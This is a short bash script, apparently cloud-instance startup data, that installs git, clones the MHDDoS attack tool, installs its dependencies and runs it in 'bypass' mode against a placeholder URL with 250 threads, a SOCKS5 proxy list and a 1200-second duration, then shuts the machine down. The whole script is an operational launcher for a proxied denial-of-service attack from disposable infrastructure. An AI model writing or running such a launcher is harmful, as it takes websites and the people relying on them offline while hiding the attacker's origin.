#! /bin/bash
set -x 
sudo yum install git -y 
git clone https://github.com/MHProDev/MHDDoS.git /home/ec2-user/ttt/
cd /home/ec2-user/ttt/ && pip3 install -r requirements.txt
python3.7 start.py bypass https://example.com 5 250 socks5.txt 100 1200 
sudo shutdown now